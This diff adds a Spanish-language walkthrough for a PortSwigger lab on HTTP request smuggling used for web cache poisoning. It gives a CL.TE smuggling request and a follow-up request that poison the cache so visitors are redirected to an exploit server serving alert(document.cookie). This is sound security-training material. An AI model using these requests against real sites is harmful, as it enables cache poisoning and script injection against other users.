@@ -836,6 +836,39 @@ asd
 
 En caso de que no se dé como resuelto el laboratorio, volver a enviarla hasta conseguirlo (esto se debe a que PortSwigger simula que la víctima navega por el sitio de forma intermitente).
 
+### [Exploiting HTTP request smuggling to perform web cache poisoning](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning)
+
+#### Solución:
+
+1. Ir al exploit server, poner en el body: alert(document.cookie) y guardar
+2. Enviar la siguiente request (reemplazando LABID y EXPLOIT-SERVER-ID):
+
+```
+POST / HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+GET /post/next?postId=6 HTTP/1.1
+Host: EXPLOIT-SERVER-ID.web-security-academy.net
+Content-Length: 108
+
+foo
+```
+
+3. Enviar la siguiente request (reemplazando LABID):
+
+```
+GET /post?postId=7 HTTP/1.1
+Host: LABID.web-security-academy.net
+
+
+```
+
+4. Repetir la request del paso 3 para confirmar que se envenenó la cache y siempre se responde con la redirección al exploit server.
+
 ---
 
 ## [OS command injection](https://portswigger.net/web-security/os-command-injection)
